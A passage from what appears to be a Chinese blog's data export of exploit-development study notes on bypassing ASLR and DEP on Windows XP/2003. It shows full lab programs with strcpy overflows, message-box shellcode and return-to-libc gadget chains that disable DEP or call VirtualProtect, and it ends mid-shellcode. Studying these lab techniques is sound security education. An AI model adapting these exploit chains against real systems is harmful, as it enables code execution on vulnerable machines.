&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90&quot; ; 如上图所示，函数返回地址的后两个字节已经被覆盖为 0x90 了。接下来就是寻找一条适合的跳板地址，由于是部分覆盖，所以 shellcode 只能放在返回地址前面，这样 JMP ESP 指令就不能再使用了。我们需要让函数跳转执行 shellcode，所以要向低地址跳转，观察寄存器，只有EAX 符合（EAX 指向 tt 的起始地址）。将函数返回地址覆盖为 CALL/JMP EAX 的指令地址（0x00b7141c）。 选择 ASLR_Offbyone.exe 中的指令，因为只有它里面的指令才有可能控制，我们选择 0x0008141C，重启系统后再查找一次。 布置 shellcode Shellcode 最开始部分为弹出对话框的机器码，然后是 0x90 填充，最后为用来覆盖返回地址后 2 个字节的 0x141C。 1234567891011121314151617181920char shellcode[]= &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x1C\\x14&quot; ; 运行成功，即使是重启系统，shellcode 依然能成功执行。 利用 Heap spray 技术定位内存 Heap spray 原理：通过申请大量内存，占领内存中的 0x0C0C0C0C 的位置，并在这些内存中放置 0x90 和 shellcode，最后控制程序转入 0x0C0C0C0C 执行。","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ASLR","slug":"ASLR","permalink":"https://www.rgzzplus.com/tags/ASLR/"}]},{"title":"数据与程序的分水岭:DEP","slug":"数据与程序的分水岭-DEP","date":"2022-06-27T01:21:00.000Z","updated":"2022-08-01T10:31:30.860Z","comments":true,"path":"2022/06/27/数据与程序的分水岭-DEP/","link":"","permalink":"https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/","excerpt":"","text":"[TOC] DEP 机制的保护原理 溢出攻击的根源在于计算机未明确区分数据和代码，DEP（数据执行保护，Data Execution Prevention）的基本原理就是将数据所在页面标识为不可执行。 DEP 的主要作用： 阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。 根据实现的机制不同可分为：软件DEP（Software DEP）和硬件DEP（Hardware-enforced DEP） 软件DEP就是SafeSEH，阻止利用 S.E.H 的攻击。 硬件DEP需要CPU支持，AMD 称之为 No-Execute Page-Protection（NX），Intel 称之为 Execute Disable Bit（XD）。 操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。内存的页面表（Page Table）中的标识位（NX/XD）来标识是否允许在该页上执行指令。标识位为 0 表示这个页面允许执行指令，设置为 1 表示该页面不允许执行指令。 DEP 工作状态： （1）Option：默认仅将 DEP 保护应用于 Windows 系统组件和服务。但用户可以通过应用程序兼容性工具(ACT， Application Compatibility Toolkit)为选定的程序启用 DEP。DEP 可被程序动态关闭。 （2）Optout：为排除列表程序外的所有程序和服务启用 DEP，用户可以手动在排除列表中指定不启用 DEP 保护的程序和服务。DEP 可被应用程序动态关闭。 （3）AlwaysON：对所有进程启用 DEP 保护，不存在排序列表，DEP 不可被关闭。 （4）AlwaysOff：对所有进程禁用 DEP，DEP 不能动态开启。 和 DEP 密切相关的程序链接选项：/NXCOMPAT 在Visual Studio 2008 ( VS 9.0)中，可以在通过菜单中的 Project→ project Properties → Configuration Properties→ Linker→ Advanced→ Data Execution Prevention(DEP)中选择是不是使用/NXCOMPAT 编译程序，如下图所示。 采用/NXCOMPAT 编译的程序会在文件的 PE 头中设置 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 标识，该标识通过结构体 IMAGE_OPTIONAL_HEADER 中的 DllCharacteristics 变量进行体现，当 DllCharacteristics 设置为 0x0100 表示该程序采用了/NXCOMPAT 编译。 操作系统中 DEP 一般工作在 Option状态，只保护系统核心进程，而经过 /NXCOMPAT 编译的程序在 Windows vista及后续版本中会自动启用 DEP 保护。 DEP的局限： （1）硬件 DEP 需要 CPU 支持。 （2）由于兼容性，windows 不能对所有进程开启 DEP 保护。 （3）/NXCOMPAT 编译选项，或者是 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 的设置，只对 windows vista 以上的系统有效。 （4）当 DEP 工作在 Option 和 Optout 下时，DEP 是可以被动态关闭和开启的，这就说明操作系统提供了某些 API 函数控制 DEP状态。早期的 API 调用没有任何限制。 攻击未启用 DEP 的程序 DEP 保护对象是进程级的，当某个进程的加载模块中只要有一个模块不支持 DEP，这个进程就不能贸然开启 DEP，否则可能会发生异常。在此不做讨论。 利用 Ret2Libc 挑战 DEP 在 DEP 保护下溢出失败的根本原因是 DEP 检测到程序转到非可执行页执行指令了，如果让程序跳转到一个已经存在的系统函数中（必然处于可执行页上），DEP是不会拦截的。 Ret2Libc 是 Return-to-llibc 简写，只要为 shellcode 中的每条指令都在代码区找到一条替代指令，就能完成 exploit 想要的功能了。但这仅仅是理论上可行，实际上操作难度极大。 绕过 DEP 的 exploit 方法： （1）通过跳转到 ZwSetInformationProcess 函数将 DEP 关闭后再转入 shellcode 执行。 （2）通过跳转到 VirtualProtect 函数来将 shellcode 所在内存页设置为可执行状态，然后再转入 shellcode 执行。 （3）通过跳转到 VIrtualAlloc 函数开辟一段具有执行权限的内存空间，然后将 shellcode 复制到这段内存中执行。 Ret2Libc 实战之利用 ZwSetinformationProcess 将进程 DEP 保护关闭。 一个进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API 函数 ZwQueryInformationProcess 和 ZwSetInformationProcess 进行查询和修改。 题外话： 在有些资料中将这些函数称为 NtQueryInformationProcess 和 NtSetInformation Process，在 Ntdll.dll 中 Nt函数和 Zw函数功能是完全一样的，本书中我们统一称之为 Zw**。 _KEXECUTE_OPTIONS 的结构： 12345678KEXECUTE_OPTIONSPos0ExecuteDisable :1bitPos1ExecuteEnable :1bitPos2DisableThunkEmulation :1bitPos3Permanent :1bitPos4ExecuteDispatchEnable :1bitPos5ImageDispatchEnable :1bitPos6Spare :2bit 前4个 bit 与 DEP 相关，当前进程 DEP 开启时 ExecuteDisable 位被置 1，当进程 DEP 关闭时 ExecuteEable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的，Permanent 被置 1 后表示这些标志都不能再被修改。 函数 NtSetInformationProcess： 12345ZwSetInformationProcess(IN HANDLE ProcessHandle,IN PROCESS_INFORMATION_CLASS ProcessInformationClass,IN PVOID ProcessInformation,IN ULONG ProcessInformationLength ); 第一个参数为进程的句柄，设置为-1 的时候表示为当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS，第四个参数为第三个参数的长度。 关闭 DEP 的参数设置： 123456ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;ZwSetInformationProcess(NtCurrentProcess(), // (HANDLE)-1ProcessExecuteFlags, // 0x22&amp;ExecuteFlags, // ptr to 0x2sizeof(ExecuteFlags)); // 0x4 函数的参数中包含 0x00，会造成字符串复制时被截断。既然自己构造参数会出问题，那么就在系统中寻找已经构造好的参数。 如果一个进程的 Permanent 位没有设置，当它加载 DLL 时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭。LdrpCheckNXCompatibility 函数，当符合以下条件之一时进程的 DEP 会被关闭： （ 1）当 DLL 受 SafeDisc 版权保护系统保护时； （ 2）当 DLL 包含有.aspcak、 .pcle、 .sforce 等字节时； （ 3） Windows Vista 下面当 DLL 包含在注册表“ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptions ”键下边标识出不需要启动 DEP 的模块时。 在 Windows XP SP3 下 LdrpCheckNXCompatibility 关闭 DEP 的具体流程，以 SafeDisc 为例，如下图： 模拟 LdrpCheckNXCompatibility 关闭 DEP 的流程，先想办法将 AL 赋值为1，然后转入执行 0x7C93CD24（CMP AL,1） 及后续指令来关闭 DEP，代码如下。 实验代码： 123456789101112131415161718192021222324252627282930313233343536#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;windows.h&gt;char shellcode[]= &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x52\\xE2\\x92\\x7C&quot;//MOV EAX,1 RETN 地址 &quot;\\x85\\x8B\\x1D\\x5D&quot;//修正 EBP &quot;\\x19\\x4A\\x97\\x7C&quot;//增大 ESP &quot;\\xB4\\xC1\\xC5\\x7D&quot;//jmp esp &quot;\\x24\\xCD\\x93\\x7C&quot;//关闭 DEP 代码的起始位置 &quot;\\xE9\\x33\\xFF\\xFF&quot;//回跳指令 &quot;\\xFF\\x90\\x90\\x90&quot;;void test()&#123; char tt[176]; strcpy(tt,shellcode);&#125;int main()&#123; HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;&#125; 实验思路： （ 1）为了更直观地反映绕过 DEP 的过程，在实验中不启用 GS 和 SafeSEH。 （ 2）函数 test 通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。 （ 3）将函数的返回地址覆盖为类似 MOV AL,1 retn 的指令，在将 AL 置 1 后转入 0x7C93CD24 关闭 DEP。 （ 4）DEP 关闭后 shellcode 就可以正常执行了。 推荐使用的环境 备 注 操作系统 Window XP SP3 DEP 状态 Optout 编译器 VC++ 6.0 编译选项 禁用优化选项 build 版本 release 版本 实验步骤： （ 1）将 AL 置为 1，后执行关闭 DEP 指令。 找到类似 MOV AL,1 RETN 的指令。OllyFindAddr 插件的 Disable DEP —&gt; Disable DEP &lt;= XP SP3 搜索结果的 Step2 就是符合要求的指令。 为避免 shellcode 在复制时被截断，需选择一个不包含 0x00 的地址，使用 0x7C92E252 覆盖函数的返回地址，让函数执行完后将 AL 置 1，然后返回控制流程。 先用小于 200 个0x90填充 shellcode，找出 tt[0] 的地址（0x0012FDB0)。然后在分析栈，找出 test() 的返回地址（0x0012FE64），来确定 shellcode 的长度为 184字节，shellcode 内容如下： 12345678charshellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;……&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x52\\xE2\\x92\\x7C&quot; //MOV EAX,1 RETN 地址; 调试运行，在 0x7C92E257（retn）处暂停程序，查看堆栈 ESP=0012FE68，指向 test() 返回地址下方，retn 将返回到 ESP 指向的内存空间（0x7C930200)。 所以我们要在 0x0012FE68 放上 0x7C93CD24（cmp al,1），来让程序转入关闭 DEP 流程，如下所示。 123456789charshellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;……&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x52\\xE2\\x92\\x7C&quot; //MOV EAX,1 RETN 地址&quot;\\x24\\xCD\\x93\\x7C&quot; //关闭 DEP 代码的起始位置; （2）产生异常，EBP 指向位置无法写入，解决问题 重新编译程序，在 0x7C93CD6F，即关闭 DEP 后的 retn 4 处下断点，然后运行。程序运行后，出现了异常，如下图。程序对 EBP-4 位置写入数据，但是 EBP 在溢出时候被破坏了，目前 EBP-4 为 90909090 不可写入，所以程序出现写入异常，在转入 0x7C93CD24 前我们需要将 EBP 指向一个可写的位置。 通过类似 PUSH ESP POP EBP RETN 的指令将 EBP 定位到一个可写的位置，用 OllyFindAddr 插件可在 Disable DEP &lt;= XP SP3 搜索结果的 Setp3 部分查看当前内存所有符合条件的指令，如下图所示。 现在，筛选出合适指令，找出可写入而不影响后续指令的寄存器，显然，PUSH ESP POP EBP RETN 指令需要放在 mov al,1 之后，在关闭 DEP 之前。而不影响关闭 DEP 的寄存器只有 ESP，所以选择 PUSH ESP POP EBP RETN 指令序列。 （3）消除 EBP-4 被冲刷影响，修正 EBP 现在还有一个严重的问题，直接将 ESP 的值赋给 EBP 返回后， ESP 相对 EBP 位于高址位置，当有入栈操作时 EBP-4 处的值可能会被冲刷掉，进而影响传入 ZwSetInformationProcess 的参数，造成 DEP 关闭失败。我们先用 0x5D1D8B85 处的 PUSH ESP POP EBP RET 4 指令来修正 EBP，然后调试根据堆栈情况来消除 EBP-4 被冲刷的影响。 12345678910charshellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;……&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x52\\xE2\\x92\\x7C&quot; //MOV EAX,1 RETN 地址&quot;\\x85\\x8B\\x1D\\x5D&quot; //修正 EBP&quot;\\x24\\xCD\\x93\\x7C&quot; //关闭 DEP 代码的起始位置; 重新编译程序后调试，在 0x7C95683B 处（CALL ZwSetInformationProcess）下断点，待程序中断后观察堆栈情况。如下图所示，EBP-4 中的内容已经被覆盖为 0x22，根据_KEXECUTE_OPTIONS 结构我们知道 DEP 只和结构中的前 4 位有关，只要前 4 位的二进制代码为 0100 就可关闭 DEP，而 0x22（00100010）刚刚符合这个要求，所以用 0x22 冲刷掉 EBP-4 处的值还是可以关闭 DEP 的。 虽然我们已经关闭了 DEP，但是我们失去了进程的控制权。我们再来看看关闭 DEP 后程序返回时堆栈的情况。单步运行到 0x7C93CD6F 处（retn 4），发现 ESP 指向 0x0012FE70，此处值为 0x00000004，它就是关闭 DEP 时 PUSH 4 的结果，现在我们无法转入 shellcode 执行了，所以我们还需要对 ESP 或者 EBP 进行调整。 （4）夺回程序控制权 ESP 值小于 EBP 时，防止入栈时破坏当前栈内容的调整方法就是减小 ESP和增大 EBP。由于 shellcode 位于内存低址，所以减小 ESP 会破坏 shellcode，而增大 EBP 的指令在本次实验中无法找到。一个变通方法是增大 ESP 到一个安全的位置，让 EBP 和 ESP 之间的空间足够大，这样关闭 DEP 过程中的压栈操作就无法冲刷到 EBP 的范围内了。 我们可以使用带有偏移量的 RETN 指令来增大 ESP，如 RETN 0x28 等指令可以执行 RETN 指令后再将 ESP 增加 0x28 个字节。我们可以通过 OllyFindAddr 插件中的 Overflow return address --&gt; POP RETN+N 选项来查找相关指令。 在选取指令时，不能对 ESP 和 EBP 有直接操作。否则会无法跳回 shellcode 执行。选择 0x7C974A19 处的 RETN 28，来增大 ESP。在关闭 DEP 前加入增大 ESP 指令地址。注意：修正 EBP 指令返回时带有的偏移量回影响后续指令，所以我们在布置 shellcode 时需加入相应填充。 123456789101112charshellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;……&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x52\\xE2\\x92\\x7C&quot; //MOV EAX,1 RETN 地址&quot;\\x85\\x8B\\x1D\\x5D&quot; //修正 EBP&quot;\\x19\\x4A\\x97\\x7C&quot; //增大 ESP&quot;\\x90\\x90\\x90\\x90&quot; //jmp esp&quot;\\x24\\xCD\\x93\\x7C&quot; //关闭 DEP 代码的起始位置; 在 0x7C93CD6F 处中断程序，建议不要在加载完程序直接在 0x7C93CD6F 中断，先在 0x7C95683B（CALL ZwSetInformationProcess）处下断点，然后单步运行到 0x7C93CD6F，否则您会被中断到崩溃。堆栈情况如下图，增大 ESP 后关键数据没有被破坏。执行完 RETN 0x04 后 ESP 将指向 0x0012FE74，所以我们只要在 0x0012FE70 放置一条 JMP ESP 指令就能让程序转入堆栈执行指令。通过 OllyFindAddr 插件中的 Overflow return address --&gt; Find CALL/JMP ESP 来搜索指令。 用 0x7DC5C1B4 处的 JMP ESP，然后在 0x0012FE70 处放一个长跳指令，让程序跳转到 shellcode 的起始位置来执行 shellcode，根据内存状态，可以计算处 0x0012FE74 距离 shellcode 起始位置（0x0012FDB0）有 200 个字节，所以需要回调 205个字节（+5 字节跳转指令长度）。 布置 shellcode，如下图所示 12345678910111213charshellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;……&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x52\\xE2\\x92\\x7C&quot; //MOV EAX,1 RETN 地址&quot;\\x85\\x8B\\x1D\\x5D&quot; //修正 EBP&quot;\\x19\\x4A\\x97\\x7C&quot; //增大 ESP&quot;\\xB4\\xC1\\xC5\\x7D&quot; //jmp esp&quot;\\x24\\xCD\\x93\\x7C&quot; //关闭 DEP 代码的起始位置&quot;\\xE9\\x33\\xFF\\xFF&quot; //回跳指令&quot;\\xFF\\x90\\x90\\x90&quot; 将 shellcode 布置好后重新编译运行，调试，在 0x7C93CD6F 处下断点，然后单步运行，观察 程序执行流程。执行完 JMP ESP 后就能看到程序转入 shellcode。 继续运行就能看到对话框了。 补充： 微软在 Windows 2003 SP2 以后对 LdrpCheckNXCompatibility 函数进行了少许修改，对我们影响最大的是该函数在执行过程中会对 ESI 指向的内存附近进行操作。保证 ESI 指向的内存为可写内存，利用类似的指令如 push esp pop esi retn 来调整 ESI，这些指令显示在 OllyFindAddr 插件中 Disable DEP→Disable DEP &gt;=2003 SP2 搜索结果的 step4 部分。 这些指令不好找，这里介绍一种替代方法： （ 1）找到 pop eax retn 指令，并让程序转入该位置执行。 （ 2）找到一条 pop esi retn 的指令，并保证在执行（ 1）中 pop eax 时它的地址位于栈顶，这样就可以把该地址放到 eax 中。 （ 3）找到 push esp jmp eax 指令，并转入执行。 这样就相当于执行了 push esp pop esi retn， esi 被指到了可写位置。下边我们给出一种可以在 Windows 2003 SP2 下边成功溢出的代码，大家可以自行调试，感受一下跳板执行选取和 shellcode 布局的思路。代码运行环境为 Windows 2003 SP2 中文版，代码中的各跳板地址可能需要重新调试。 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;windows.h&gt;char shellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\xE9\\x77\\xBE\\x77&quot; //修正 EBP&quot;\\x81\\x71\\xBA\\x7C&quot; //pop eax retn&quot;\\x0A\\x1A\\xBF\\x7C&quot; //pop pop pop retn&quot;\\x3D\\x68\\xBE\\x7C&quot; //pop esi retn&quot;\\xBF\\x7D\\xC9\\x77&quot; //push esp jmp eax&quot;\\x9B\\xF4\\x87\\x7C&quot; //retn 0x30&quot;\\x17\\xF5\\x96\\x7C&quot; //关闭 DEP 代码的起始位置&quot;\\x23\\x1E\\x1A\\x7D&quot; //jmp esp&quot;\\xE9\\x27\\xFF\\xFF&quot; //跳转到 shellcode 起始地址&quot;\\xFF\\x90\\x90\\x90&quot;;void test()&#123; char tt[176]; strcpy(tt,shellcode);&#125;int main()&#123; HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;&#125; Ret2Libc 实战之利用 VirtualProtect Optout 和 AlwaysON 模式下所有进程是默认开启 DEP，这时如果一个程序自身偶尔需要从堆栈中取指令，则会发生错误。为了解决这个问题微软提供了修改内存属性的 VirtualProtect 函数，该函数位于 kernel32.dll 中，该函数可以修改指定内存的属性，包括是否可执行属性。因此只要我们在栈帧中布置好合适的参数，并让程序转入 VirtualProtect 函数执行，就可以将 shellcode 所在内存设置为可执行状态，进而绕过 DEP。 1234567BOOL VirtualProtect(LPVOID lpAddress, //要改变属性的内存起始地址。DWORD dwSize, //要改变属性的内存区域大小。DWORD flNewProtect, //内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（ 0x40）时该内存页为可读可写可执行。PDWORD lpflOldProtect //内存原始属性类型保存地址。);//修改内存属性成功时函数返回非 0，修改失败时返回 0。 [EBP+C]和[EBP+10]这两个参数是固定的，[EBP+8]和[EBP+14]这两个参数是动态确定的，要保证[EBP+8]可以落在我们可以控制的堆栈范围内，[EBP+14]要保证为一可写地址。 按照如下参数布置好栈帧就可以将 shellcode 所在内存区域设置为可执行模式。 123456BOOL VirtualProtect(shellcode 所在内存空间起始地址,shellcode 大小,0x40,某个可写地址); 注意： （ 1）参数中包含 0x00，strcpy 在复制字符串的时候会被截断，所以我们不能攻击 strcpy 函数，改为攻击 memcpy 函数。 （ 2）对 shellcode 所在内存空间起始地址的确定，不同机器之间 shellcode 在内存中的位置可能会有变化，本次实验中我们在栈帧中构造方法动态确定 shellcode 所在内存空间起始地址。 实验代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;windows.h&gt;char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot; //pop eax retn &quot;\\x0A\\x1A\\xBF\\x7C&quot; //pop pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot; //修正 EBP &quot;\\x8B\\x17\\x84\\x7C&quot; //RETN &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBF\\x7D\\xC9\\x77&quot; //push esp jmp eax &quot;\\xFF\\x00\\x00\\x00&quot; //修改内存大小 &quot;\\x40\\x00\\x00\\x00&quot; //可读可写可执行内存属性代码 &quot;\\xBF\\x7D\\xC9\\x77&quot; //push esp jmp eax &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xE8\\x1F\\x80\\x7C&quot; //修改内存属性 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xA4\\xDE\\xA2\\x7C&quot; //jmp esp &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; 